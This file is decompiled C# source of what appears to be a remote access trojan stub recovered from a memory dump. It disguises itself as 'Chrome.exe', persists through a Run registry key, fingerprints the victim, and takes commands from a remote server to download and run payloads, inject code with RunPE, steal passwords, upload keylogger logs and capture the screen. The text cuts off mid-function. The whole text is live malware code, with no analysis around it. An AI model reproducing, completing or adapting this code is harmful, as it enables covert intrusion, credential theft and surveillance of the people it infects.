// Decompiled with JetBrains decompiler
// Type: j.OK
// Assembly: stub, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5D061B43-92C3-47A8-A000-0E762F8D5CF4
// Assembly location: C:\Users\gorno\Desktop\vm\Dumps\UnknownName\vdump_00400000.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using My;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace j
{
  [StandardModule]
  internal sealed class OK
  {
    public static bool MsgExc = Convert.ToBoolean("False");
    private static Encoding enc = Encoding.Unicode;
    private static string nt = A.mtx + "_01";
    public static Encoding Encoding = Encoding.Default;
    public static string PastaArq;
    public static string Kx;
    public static string ISUName;
    public static string ISFName;
    public static bool ATT;
    public static bool STask;
    public static bool EncHP;
    public static string Prt;
    public static string h;
    private static byte[] b;
    public static bool BD;
    public static TcpClient C;
    public static bool Cn;
    public static string DR;
    public static string EXE;
    public static Computer F;
    public static FileStream FS;
    public static bool Idr;
    public static bool IsF;
    public static bool Isu;
    public static kl kq;
    public static Enviar En;
    public static string Em;
    private static string lastcap;
    public static FileInfo LO;
    private static MemoryStream MeM;
    public static object MT;
    public static object PLG;
    public static string RG;
    public static string sf;
    public static string VN;
    public static string VR;
    public static string Y;

    static OK()
    {
      string s = "OUdZVXZjb3ZyMlBRcXIxVjRoMGQ=";
      OK.Kx = OK.DEB(ref s);
      OK.ISUName = "Chrome";
      OK.ISFName = "Chrome";
      OK.ATT = Conversions.ToBoolean("True");
      OK.STask = Conversions.ToBoolean("True");
      OK.EncHP = Conversions.ToBoolean("True");
      OK.Prt = "Rxd7pshO8i8DuaJAh35Mmw==";
      OK.h = "nRFjEcLEQi8HbJDq0JqwuLNaqrOmqADZWRlLO66nsoE=";
      OK.b = new byte[5121];
      OK.BD = Conversions.ToBoolean("True");
      OK.C = (TcpClient) null;
      OK.Cn = false;
      OK.DR = "TEMP";
      OK.EXE = "Chrome.exe";
      OK.F = new Computer();
      OK.Idr = Conversions.ToBoolean("True");
      OK.IsF = Conversions.ToBoolean("True");
      OK.Isu = Conversions.ToBoolean("True");
      OK.kq = (kl) null;
      OK.En = (Enviar) null;
      OK.Em = "False";
      OK.lastcap = "";
      OK.LO = new FileInfo(Assembly.GetEntryAssembly().Location);
      OK.MeM = new MemoryStream();
      OK.MT = (object) null;
      OK.PLG = (object) null;
      OK.RG = "H6WadTx73nSVtRX";
      OK.sf = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
      OK.VN = "d2luZG93cw==";
      OK.VR = "RC 1.0";
      OK.Y = "|P|P|";
    }

    public static string ACT()
    {
      string str1;
      string str2;
      try
      {
        IntPtr foregroundWindow = OK.GetForegroundWindow();
        if (foregroundWindow == IntPtr.Zero)
        {
          str1 = "";
          goto label_5;
        }
        else
        {
          string str3 = Strings.Space(checked (OK.GetWindowTextLength((long) foregroundWindow) + 1));
          OK.GetWindowText(foregroundWindow, ref str3, str3.Length);
          str2 = OK.ENB(ref str3);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        str2 = "";
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      str1 = str2;
label_5:
      return str1;
    }

    [DllImport("avicap32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern bool capGetDriverDescriptionA(short wDriver, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszName, int cbName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVer, int cbVer);

    private static bool CompDir(FileInfo F1, FileInfo F2)
    {
      bool flag;
      if (Operators.CompareString(F1.Name.ToLower(), F2.Name.ToLower(), false) == 0)
      {
        DirectoryInfo directoryInfo1 = F1.Directory;
        DirectoryInfo directoryInfo2 = F2.Directory;
        while (Operators.CompareString(directoryInfo1.Name.ToLower(), directoryInfo2.Name.ToLower(), false) == 0)
        {
          directoryInfo1 = directoryInfo1.Parent;
          directoryInfo2 = directoryInfo2.Parent;
          if (directoryInfo1 == null & directoryInfo2 == null)
          {
            flag = true;
            goto label_10;
          }
          else if (directoryInfo1 == null)
          {
            flag = false;
            goto label_10;
          }
          else if (directoryInfo2 == null)
            goto label_9;
        }
        flag = false;
        goto label_10;
      }
label_9:
      flag = false;
label_10:
      return flag;
    }

    public static bool connect()
    {
      OK.Cn = false;
      Thread.Sleep(500);
      lock ((object) OK.LO)
      {
        try
        {
          if (OK.C != null)
          {
            try
            {
              OK.C.Close();
              OK.C = (TcpClient) null;
            }
            catch (Exception exception_4)
            {
              ProjectData.SetProjectError(exception_4);
              ProjectData.SetProjectError(exception_4);
              ProjectData.ClearProjectError();
              ProjectData.ClearProjectError();
            }
          }
          try
          {
            OK.MeM.Dispose();
          }
          catch (Exception exception_2)
          {
            ProjectData.SetProjectError(exception_2);
            ProjectData.SetProjectError(exception_2);
            ProjectData.ClearProjectError();
            ProjectData.ClearProjectError();
          }
        }
        catch (Exception exception_3)
        {
          ProjectData.SetProjectError(exception_3);
          ProjectData.SetProjectError(exception_3);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
        try
        {
          OK.MeM = new MemoryStream();
          OK.C = new TcpClient();
          OK.C.ReceiveBufferSize = 204800;
          OK.C.SendBufferSize = 204800;
          OK.C.Client.SendTimeout = 10000;
          OK.C.Client.ReceiveTimeout = 10000;
          OK.C.Connect(OK.HOST(), Conversions.ToInteger(OK.P()));
          OK.Cn = true;
          OK.Send(OK.inf());
          try
          {
            string local_4;
            string local_4_1;
            if (Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(OK.GTV("vn", (object) "")), (object) "", false))
            {
              local_4_1 = local_4 + OK.DEB(ref OK.VN) + "\r\n";
            }
            else
            {
              string temp_32 = local_4;
              string local_5 = Conversions.ToString(RuntimeHelpers.GetObjectValue(OK.GTV("vn", (object) "")));
              string temp_39 = OK.DEB(ref local_5);
              string temp_40 = "\r\n";
              local_4_1 = temp_32 + temp_39 + temp_40;
            }
            string local_4_2 = local_4_1 + OK.HOST() + ":" + OK.P() + "\r\n" + OK.DR + "\r\n" + OK.EXE + "\r\n" + Conversions.ToString(OK.Idr) + "\r\n" + Conversions.ToString(OK.IsF) + "\r\n" + Conversions.ToString(OK.Isu) + "\r\n" + Conversions.ToString(OK.BD);
            OK.Send("inf" + OK.Y + OK.ENB(ref local_4_2));
          }
          catch (Exception exception_0)
          {
            ProjectData.SetProjectError(exception_0);
            ProjectData.SetProjectError(exception_0);
            ProjectData.ClearProjectError();
            ProjectData.ClearProjectError();
          }
        }
        catch (Exception exception_1)
        {
          ProjectData.SetProjectError(exception_1);
          ProjectData.SetProjectError(exception_1);
          OK.Cn = false;
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      return OK.Cn;
    }

    public static void ED()
    {
      OK.pr(0);
    }

    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr GetForegroundWindow();

    [DllImport("kernel32", EntryPoint = "GetVolumeInformationA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetVolumeInformation([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpRootPathName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpVolumeNameBuffer, int nVolumeNameSize, ref int lpVolumeSerialNumber, ref int lpMaximumComponentLength, ref int lpFileSystemFlags, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileSystemNameBuffer, int nFileSystemNameSize);

    [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int GetWindowText(IntPtr hWnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string WinTitle, int MaxLength);

    [DllImport("user32.dll", EntryPoint = "GetWindowTextLengthA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int GetWindowTextLength(long hwnd);

    private static int StartProcessHidden(string FileName, bool WaitForExit, string Arguments = "")
    {
      using (Process process = new Process())
      {
        process.StartInfo.FileName = FileName;
        process.StartInfo.Arguments = Arguments;
        process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
        process.StartInfo.CreateNoWindow = true;
        process.StartInfo.UseShellExecute = false;
        process.Start();
        if (WaitForExit)
          process.WaitForExit();
        return process.ExitCode;
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public static void Ind(byte[] b)
    {
      string[] strArray1 = Strings.Split(OK.BS(ref b), OK.Y, -1, CompareMethod.Binary);
      try
      {
        string str1 = strArray1[0];
        // ISSUE: reference to a compiler-generated method
        uint stringHash = \u003CPrivateImplementationDetails\u003E.ComputeStringHash(str1);
        if (stringHash <= 1160889637U)
        {
          if (stringHash <= 624365154U)
          {
            if ((int) stringHash != 37267537)
            {
              if ((int) stringHash == 624365154 && Operators.CompareString(str1, "MSG", false) == 0)
                OK.msgbox(strArray1[1], strArray1[2], strArray1[3], strArray1[4]);
            }
            else if (Operators.CompareString(str1, "RunPE", false) == 0)
              RunPE.Run(Convert.FromBase64String(strArray1[1]), strArray1[2], Assembly.GetExecutingAssembly().Location, false);
          }
          else if ((int) stringHash != 846483987)
          {
            if ((int) stringHash != 1128069874)
            {
              if ((int) stringHash == 1160889637 && Operators.CompareString(str1, "ll", false) == 0)
              {
                OK.Cn = false;
                return;
              }
            }
            else if (Operators.CompareString(str1, "kl", false) == 0)
            {
              OK.Send("kl" + OK.Y + OK.ENB(ref kl.Logs));
              return;
            }
          }
          else if (Operators.CompareString(str1, "Dll", false) == 0)
            System.IO.File.WriteAllBytes(Application.StartupPath + "\\" + strArray1[1], Convert.FromBase64String(strArray1[2]));
        }
        else if (stringHash <= 2371348074U)
        {
          if ((int) stringHash != 1223071423)
          {
            if ((int) stringHash == -1923619222 && Operators.CompareString(str1, "Run", false) == 0)
            {
              string path = Path.GetTempFileName().Replace(".tmp", strArray1[2]);
              if (System.IO.File.Exists(path))
                System.IO.File.Delete(path);
              System.IO.File.WriteAllBytes(path, Convert.FromBase64String(strArray1[1]));
              ProcessStartInfo startInfo = new ProcessStartInfo()
              {
                FileName = path
              };
              if (strArray1.Length > 3)
                startInfo.WindowStyle = (ProcessWindowStyle) Convert.ToInt32(strArray1[3]);
              if (strArray1.Length > 4)
                startInfo.Arguments = strArray1[4];
              Process.Start(startInfo);
            }
          }
          else if (Operators.CompareString(str1, "Nt", false) == 0)
            OK.notes(strArray1[1]);
        }
        else if ((int) stringHash != -1358981756)
        {
          if ((int) stringHash != -1163892614)
          {
            if ((int) stringHash == -281135974 && Operators.CompareString(str1, "prof", false) == 0)
            {
              string Left = strArray1[1];
              if (Operators.CompareString(Left, "~", false) != 0)
              {
                if (Operators.CompareString(Left, "!", false) != 0)
                {
                  if (Operators.CompareString(Left, "@", false) != 0)
                    return;
                  OK.DLV(strArray1[2]);
                  return;
                }
                OK.STV(strArray1[2], (object) strArray1[3], RegistryValueKind.String);
                OK.Send(Conversions.ToString(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject((object) ("getvalue" + OK.Y + strArray1[1] + OK.Y), RuntimeHelpers.GetObjectValue(OK.GTV(strArray1[1], (object) ""))))));
                return;
              }
              OK.STV(strArray1[2], (object) strArray1[3], RegistryValueKind.String);
              return;
            }
          }
          else if (Operators.CompareString(str1, "GetPass", false) == 0)
            RunPE.Run(Convert.FromBase64String(strArray1[1]), " /sxml " + Interaction.Environ("Temp") + "\\s.xml", Assembly.GetExecutingAssembly().Location, false);
        }
        else if (Operators.CompareString(str1, "NtS", false) == 0)
          OK.Send("NtS" + OK.Y + OK.notesmsg());
        if (Operators.CompareString(str1, "rn", false) == 0)
        {
          byte[] bytes;
          if ((int) strArray1[2][0] == 31)
          {
            try
            {
              MemoryStream memoryStream = new MemoryStream();
              int length = (strArray1[0] + OK.Y + strArray1[1] + OK.Y).Length;
              byte[] buffer = b;
              int offset = length;
              int count = checked (b.Length - length);
              memoryStream.Write(buffer, offset, count);
              bytes = OK.ZIP(memoryStream.ToArray());
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.SetProjectError(ex);
              OK.Send("MSG" + OK.Y + "Execute ERROR");
              OK.Send("bla");
              ProjectData.ClearProjectError();
              ProjectData.ClearProjectError();
              return;
            }
          }
          else
          {
            WebClient webClient = new WebClient();
            try
            {
              bytes = webClient.DownloadData(strArray1[2]);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.SetProjectError(ex);
              OK.Send("MSG" + OK.Y + "Download ERROR");
              OK.Send("bla");
              ProjectData.ClearProjectError();
              ProjectData.ClearProjectError();
              return;
            }
          }
          OK.Send("bla");
          string str2 = Path.GetTempFileName() + "." + strArray1[1];
          try
          {
            System.IO.File.WriteAllBytes(str2, bytes);
            Process.Start(str2);
            OK.Send("MSG" + OK.Y + "Executed As " + new FileInfo(str2).Name);
          }
          catch (Exception ex1)
          {
            ProjectData.SetProjectError(ex1);
            Exception ex2 = ex1;
            ProjectData.SetProjectError(ex2);
            Exception exception = ex2;
            OK.Send("MSG" + OK.Y + "Execute ERROR " + exception.Message);
            ProjectData.ClearProjectError();
            ProjectData.ClearProjectError();
          }
        }
        else if (Operators.CompareString(str1, "inv", false) != 0)
        {
          if (Operators.CompareString(str1, "ret", false) != 0)
          {
            if (Operators.CompareString(str1, "CAP", false) != 0)
            {
              if (Operators.CompareString(str1, "un", false) == 0)
              {
                string Left = strArray1[1];
                if (Operators.CompareString(Left, "~", false) != 0)
                {
                  if (Operators.CompareString(Left, "!", false) != 0)
                  {
                    if (Operators.CompareString(Left, "@", false) != 0)
                      return;
                    OK.pr(0);
                    Process.Start(OK.LO.FullName);
                    ProjectData.EndApp();
                  }
                  else
                  {
                    OK.pr(0);
                    ProjectData.EndApp();
                  }
                }
                else
                  OK.UNS();
              }
              else if (Operators.CompareString(str1, "up", false) == 0)
              {
                byte[] bytes;
                if ((int) strArray1[1][0] == 31)
                {
                  try
                  {
                    MemoryStream memoryStream = new MemoryStream();
                    int length = (strArray1[0] + OK.Y).Length;
                    byte[] buffer = b;
                    int offset = length;
                    int count = checked (b.Length - length);
                    memoryStream.Write(buffer, offset, count);
                    bytes = OK.ZIP(memoryStream.ToArray());
                  }
                  catch (Exception ex)
                  {
                    ProjectData.SetProjectError(ex);
                    ProjectData.SetProjectError(ex);
                    OK.Send("MSG" + OK.Y + "Update ERROR");
                    OK.Send("bla");
                    ProjectData.ClearProjectError();
                    ProjectData.ClearProjectError();
                    return;
                  }
                }
                else
                {
                  WebClient webClient = new WebClient();
                  try
                  {
                    bytes = webClient.DownloadData(strArray1[1]);
                  }
                  catch (Exception ex)
                  {
                    ProjectData.SetProjectError(ex);
                    ProjectData.SetProjectError(ex);
                    OK.Send("MSG" + OK.Y + "Update ERROR");
                    OK.Send("bla");
                    ProjectData.ClearProjectError();
                    ProjectData.ClearProjectError();
                    return;
                  }
                }
                OK.Send("bla");
                string str2 = Path.GetTempFileName() + ".exe";
                try
                {
                  OK.Send("MSG" + OK.Y + "Updating To " + new FileInfo(str2).Name);
                  Thread.Sleep(2000);
                  System.IO.File.WriteAllBytes(str2, bytes);
                  Process.Start(str2, "..");
                }
                catch (Exception ex1)
                {
                  ProjectData.SetProjectError(ex1);
                  Exception ex2 = ex1;
                  ProjectData.SetProjectError(ex2);
                  Exception exception = ex2;
                  OK.Send("MSG" + OK.Y + "Update ERROR " + exception.Message);
                  ProjectData.ClearProjectError();
                  ProjectData.ClearProjectError();
                  return;
                }
                OK.UNS();
              }
              else if (Operators.CompareString(str1, "Ex", false) == 0)
              {
                if (OK.PLG == null)
                {
                  OK.Send("PLG");
                  int num = 0;
                  while (!(OK.PLG != null | num == 20 | !OK.Cn))
                  {
                    checked { ++num; }
                    Thread.Sleep(1000);
                  }
                  if (OK.PLG == null | !OK.Cn)
                    return;
                }
                object[] Arguments = new object[1]
                {
                  (object) b
                };
                bool[] CopyBack = new bool[1]{ true };
                NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(OK.PLG), (System.Type) null, "ind", Arguments, (string[]) null, (System.Type[]) null, CopyBack, true);
                if (!CopyBack[0])
                  return;
                b = (byte[]) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Arguments[0])), typeof (byte[]));
              }
              else
              {
                if (Operators.CompareString(str1, "PLG", false) != 0)
                  return;
                MemoryStream memoryStream = new MemoryStream();
                int length = (strArray1[0] + OK.Y).Length;
                byte[] buffer = b;
                int offset = length;
                int count = checked (b.Length - length);
                memoryStream.Write(buffer, offset, count);
                OK.PLG = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(OK.Plugin(OK.ZIP(memoryStream.ToArray()), "A")));
                NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(OK.PLG), (System.Type) null, "H", new object[1]
                {
                  (object) OK.HOST()
                }, (string[]) null, (System.Type[]) null);
                NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(OK.PLG), (System.Type) null, "P", new object[1]
                {
                  (object) OK.P()
                }, (string[]) null, (System.Type[]) null);
                NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(OK.PLG), (System.Type) null, "c", new object[1]
                {
                  (object) OK.C
                }, (string[]) null, (System.Type[]) null);
              }
            }
            else
            {
              Bitmap bitmap1 = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format16bppRgb555);
              Graphics g = Graphics.FromImage((Image) bitmap1);
              Size blockRegionSize = new Size(bitmap1.Width, bitmap1.Height);
              g.CopyFromScreen(0, 0, 0, 0, blockRegionSize, CopyPixelOperation.SourceCopy);
              try
              {
                Rectangle targetRect = new Rectangle(Cursor.Position, new Size(32, 32));
                Cursors.Default.Draw(g, targetRect);
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
                ProjectData.ClearProjectError();
              }
              g.Dispose();
              Bitmap bitmap2 = new Bitmap(Conversions.ToInteger(strArray1[1]), Conversions.ToInteger(strArray1[2]));
              Graphics graphics = Graphics.FromImage((Image) bitmap2);
              graphics.DrawImage((Image) bitmap1, 0, 0, bitmap2.Width, bitmap2.Height);
              graphics.Dispose();
              MemoryStream memoryStream1 = new MemoryStream();
              string S = "CAP" + OK.Y;
              b = OK.SB(ref S);
              memoryStream1.Write(b, 0, b.Length);
              MemoryStream memoryStream2 = new MemoryStream();
              bitmap2.Save((Stream) memoryStream2, ImageFormat.Jpeg);
              string Left = OK.md5(memoryStream2.ToArray());
              if (Operators.CompareString(Left, OK.lastcap, false) != 0)
              {
                OK.lastcap = Left;
                memoryStream1.Write(memoryStream2.ToArray(), 0, checked ((int) memoryStream2.Length));
              }
              else
                memoryStream1.WriteByte((byte) 0);
              OK.Sendb(memoryStream1.ToArray());
              memoryStream1.Dispose();
              memoryStream2.Dispose();
              bitmap1.Dispose();
              bitmap2.Dispose();
            }
          }
          else
          {
            byte[] b1 = (byte[]) OK.GTV(strArray1[1], (object) new byte[0]);
            if (strArray1[2].Length < 10 & b1.Length == 0)
            {
              OK.Send("pl" + OK.Y + strArray1[1] + OK.Y + Conversions.ToString(1));
            }
            else
            {
              if (strArray1[2].Length > 10)
              {
                MemoryStream memoryStream = new MemoryStream();
                int length = (strArray1[0] + OK.Y + strArray1[1] + OK.Y).Length;
                byte[] buffer = b;
                int offset = length;
                int count = checked (b.Length - length);
                memoryStream.Write(buffer, offset, count);
                b1 = OK.ZIP(memoryStream.ToArray());
                OK.STV(strArray1[1], (object) b1, RegistryValueKind.Binary);
              }
              OK.Send("pl" + OK.Y + strArray1[1] + OK.Y + Conversions.ToString(0));
              object objectValue = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(OK.Plugin(b1, "A")));
              string[] strArray2 = new string[5]
              {
                "ret",
                OK.Y,
                strArray1[1],
                OK.Y,
                null
              };
              int index = 4;
              string s = Conversions.ToString(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "GT", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null)));
              string str2 = OK.ENB(ref s);
              strArray2[index] = str2;
              OK.Send(string.Concat(strArray2));
            }
          }
        }
        else
        {
          byte[] b1 = (byte[]) OK.GTV(strArray1[1], (object) new byte[0]);
          if (strArray1[3].Length < 10 & b1.Length == 0)
          {
            OK.Send("pl" + OK.Y + strArray1[1] + OK.Y + Conversions.ToString(1));
          }
          else
          {
            if (strArray1[3].Length > 10)
            {
              MemoryStream memoryStream = new MemoryStream();
              int length = (strArray1[0] + OK.Y + strArray1[1] + OK.Y + strArray1[2] + OK.Y).Length;
              memoryStream.Write(b, length, checked (b.Length - length));
              b1 = OK.ZIP(memoryStream.ToArray());
              OK.STV(strArray1[1], (object) b1, RegistryValueKind.Binary);
            }
            OK.Send("pl" + OK.Y + strArray1[1] + OK.Y + Conversions.ToString(0));
            object objectValue = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(OK.Plugin(b1, "A")));
            NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "h", new object[1]
            {
              (object) OK.HOST()
            }, (string[]) null, (System.Type[]) null);
            NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "p", new object[1]
            {
              (object) OK.P()
            }, (string[]) null, (System.Type[]) null);
            NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "osk", new object[1]
            {
              (object) strArray1[2]
            }, (string[]) null, (System.Type[]) null);
            NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "start", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
            while (!Conversions.ToBoolean(RuntimeHelpers.GetObjectValue(Operators.OrObject((object) !OK.Cn, RuntimeHelpers.GetObjectValue(Operators.CompareObjectEqual(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "Off", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null)), (object) true, false))))))
              Thread.Sleep(1);
            NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "off", new object[1]
            {
              (object) true
            }, (string[]) null, (System.Type[]) null);
          }
        }
      }
      catch (Exception ex1)
      {
        ProjectData.SetProjectError(ex1);
        Exception ex2 = ex1;
        ProjectData.SetProjectError(ex2);
        Exception exception = ex2;
        if (strArray1.Length > 0 && Operators.CompareString(strArray1[0], "Ex", false) == 0 | Operators.CompareString(strArray1[0], "PLG", false) == 0)
          OK.PLG = (object) null;
        try
        {
          OK.Send("ER" + OK.Y + strArray1[0] + OK.Y + exception.Message);
        }
        catch (Exception ex3)
        {
          ProjectData.SetProjectError(ex3);
          ProjectData.SetProjectError(ex3);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }

    public static string inf()
    {
      string str1 = "ll" + OK.Y;
      string str2;
      try
      {
        if (Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(OK.GTV("vn", (object) "")), (object) "", false))
        {
          string str3 = str1;
          string s = OK.DEB(ref OK.VN) + "_" + OK.HWD();
          string str4 = OK.ENB(ref s);
          string y = OK.Y;
          str2 = str3 + str4 + y;
        }
        else
        {
          string str3 = str1;
          string s1 = Conversions.ToString(RuntimeHelpers.GetObjectValue(OK.GTV("vn", (object) "")));
          string s2 = OK.DEB(ref s1) + "_" + OK.HWD();
          string str4 = OK.ENB(ref s2);
          string y = OK.Y;
          str2 = str3 + str4 + y;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        string str3 = str1;
        string s = OK.HWD();
        string str4 = OK.ENB(ref s);
        string y = OK.Y;
        str2 = str3 + str4 + y;
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      string str5;
      try
      {
        str5 = str2 + Environment.MachineName + OK.Y;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        str5 = str2 + "??" + OK.Y;
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      string str6;
      try
      {
        str6 = str5 + Environment.UserName + OK.Y;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        str6 = str5 + "??" + OK.Y;
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      string str7;
      try
      {
        string str3 = str6;
        DateTime dateTime = OK.LO.LastWriteTime;
        dateTime = dateTime.Date;
        string str4 = dateTime.ToString("dd/MM/yyyy");
        string y = OK.Y;
        str7 = str3 + str4 + y;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        str7 = str6 + "??/??/????" + OK.Y;
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      string str8 = str7 + OK.Y;
      string str9;
      try
      {
        str9 = str8 + OK.F.Info.OSFullName.Replace("Microsoft", "").Replace("Windows", "Win").Replace("®", "").Replace("™", "").Replace("  ", " ").Replace(" Win", "Win");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        str9 = str8 + "??";
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      string str10 = str9 + "SP";
      string str11;
      try
      {
        string[] strArray = Strings.Split(Environment.OSVersion.ServicePack, " ", -1, CompareMethod.Binary);
        if (strArray.Length == 1)
          str10 += "0";
        str11 = str10 + strArray[checked (strArray.Length - 1)];
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        str11 = str10 + "0";
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      string str12;
      try
      {
        str12 = !Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains("x86") ? str11 + " x86" + OK.Y : str11 + " x64" + OK.Y;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        str12 = str11 + OK.Y;
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      string[] strArray1 = new string[6]
      {
        !OK.Cam() ? str12 + "No" + OK.Y : str12 + "Yes" + OK.Y,
        OK.VR,
        OK.Y,
        "..",
        OK.Y,
        null
      };
      int index1 = 5;
      string s3 = OK.ACT();
      string str13 = OK.DEB(ref s3);
      strArray1[index1] = str13;
      string str14 = string.Concat(strArray1) + OK.Y + OK.GetAV() + OK.Y + OK.GetPriv() + OK.Y + OK.ram() + OK.Y + OK.GetFirewall() + OK.Y + OK.P() + OK.Y + OK.totalram() + OK.Y + OK.cpu() + OK.Y;
      string str15 = "";
      try
      {
        string[] valueNames = OK.F.Registry.CurrentUser.CreateSubKey("Software\\" + OK.RG, RegistryKeyPermissionCheck.Default).GetValueNames();
        int index2 = 0;
        while (index2 < valueNames.Length)
        {
          string str3 = valueNames[index2];
          if (str3.Length == 32)
            str15 = str15 + str3 + ",";
          checked { ++index2; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      return str14 + str15;
    }

    private static string cpu()
    {
      string str;
      try
      {
        string empty = string.Empty;
        ManagementObjectCollection.ManagementObjectEnumerator enumerator;
        try
        {
          enumerator = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor WHERE DeviceID='CPU0'").Get().GetEnumerator();
          while (enumerator.MoveNext())
          {
            ManagementObject current = (ManagementObject) enumerator.Current;
            empty += current["Name"].ToString();
          }
        }
        finally
        {
          if (enumerator != null)
            enumerator.Dispose();
        }
        str = empty;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str = "";
        ProjectData.ClearProjectError();
      }
      return str;
    }

    private static string totalram()
    {
      string str;
      try
      {
        str = ((double) MyProject.Computer.Info.TotalPhysicalMemory / 1073741824.0).ToString("#.##GB");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str = "";
        ProjectData.ClearProjectError();
      }
      return str;
    }

    private static string ram()
    {
      string str;
      try
      {
        str = Conversions.ToString(checked (100 - Convert.ToInt32(unchecked ((double) MyProject.Computer.Info.AvailablePhysicalMemory / (double) MyProject.Computer.Info.TotalPhysicalMemory * 100.0)))) + "%";
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str = "";
        ProjectData.ClearProjectError();
      }
      return str;
    }

    private static string GetPriv()
    {
      string str;
      try
      {
        str = !new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) ? "User Privilege" : "Admin Privilege";
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str = "";
        ProjectData.ClearProjectError();
      }
      return str;
    }

    private static string GetAV()
    {
      string str;
      try
      {
        string Left = string.Empty;
        ManagementObjectCollection.ManagementObjectEnumerator enumerator;
        try
        {
